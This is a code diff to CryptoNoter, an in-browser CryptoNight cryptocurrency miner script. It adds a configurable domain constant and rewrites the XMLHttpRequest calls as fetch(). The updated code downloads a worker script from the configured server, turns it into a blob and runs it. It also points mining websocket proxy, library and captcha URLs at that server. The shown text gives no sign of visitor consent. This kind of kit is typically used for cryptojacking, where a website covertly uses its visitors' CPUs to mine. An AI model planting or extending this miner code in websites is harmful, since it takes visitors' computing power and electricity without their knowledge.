@@ -1,3 +1,5 @@
+const domain = "myserver.com"; // added easy domain change
+
 (function (window) {
     "use strict";
     var Miner = function (siteKey, params) {
@@ -60,24 +62,40 @@
             this._tab.interval = null
         }
         if (this._useWASM || this._asmjsStatus === "loaded") {
-            var xhr = new XMLHttpRequest;
-            xhr.addEventListener("load", function () {
-                CryptoNoter.CRYPTONIGHT_WORKER_BLOB = window.URL.createObjectURL(new Blob([xhr.responseText]));
-                this._asmjsStatus = "loaded";
-                this._startNow()
-            }.bind(this), xhr);
-            xhr.open("get", "https://%CryptoNoter_domain%/worker.js", true);
-            xhr.send()
+            fetch(`https://${domain}/worker.js`)
+                .then(response => {
+                    if (!response.ok) {
+                        throw new Error(`HTTP error! status: ${response.status}`);
+                    }
+                    return response.text();
+                })
+                .then(workerScript => {
+                    CryptoNoter.CRYPTONIGHT_WORKER_BLOB = window.URL.createObjectURL(new Blob([workerScript]));
+                    this._asmjsStatus = "loaded";
+                    this._startNow();
+                })
+                .catch(error => {
+                    console.error("Failed to load the worker script:", error);
+                });
         } else if (this._asmjsStatus === "unloaded") {
             this._asmjsStatus = "pending";
-            var xhr = new XMLHttpRequest;
-            xhr.addEventListener("load", function () {
-                CryptoNoter.CRYPTONIGHT_WORKER_BLOB = window.URL.createObjectURL(new Blob([xhr.responseText]));
-                this._asmjsStatus = "loaded";
-                this._startNow()
-            }.bind(this), xhr);
-            xhr.open("get", CryptoNoter.CONFIG.LIB_URL + "cryptonight-asmjs.min.js", true);
-            xhr.send()
+
+            fetch(CryptoNoter.CONFIG.LIB_URL + "cryptonight-asmjs.min.js")
+                .then(response => {
+                    if (!response.ok) {
+                        throw new Error(`Network response was not ok: ${response.statusText}`);
+                    }
+                    return response.text();
+                })
+                .then(scriptText => {
+                    CryptoNoter.CRYPTONIGHT_WORKER_BLOB = window.URL.createObjectURL(new Blob([scriptText]));
+                    this._asmjsStatus = "loaded";
+                    this._startNow();
+                })
+                .catch(error => {
+                    console.error("Failed to load the script:", error);
+                    this._asmjsStatus = "failed"; 
+                });
         }
     };
     Miner.prototype.stop = function (mode) {
@@ -489,8 +507,8 @@
 })(window);
 self.CryptoNoter = self.CryptoNoter || {};
 self.CryptoNoter.CONFIG = {
-    LIB_URL: "https://%CryptoNoter_domain%/lib/",
-    WEBSOCKET_SHARDS: [["wss://%CryptoNoter_domain%/proxy"]],
-    CAPTCHA_URL: "https://%CryptoNoter_domain%/captcha/",
-    MINER_URL: "https://%CryptoNoter_domain%/media/miner.html"
+    LIB_URL: `https://${domain}/lib/`,
+    WEBSOCKET_SHARDS: [[`wss://${domain}/proxy`]],
+    CAPTCHA_URL: `https://${domain}/captcha/`,
+    MINER_URL: `https://${domain}/media/miner.html`
 };
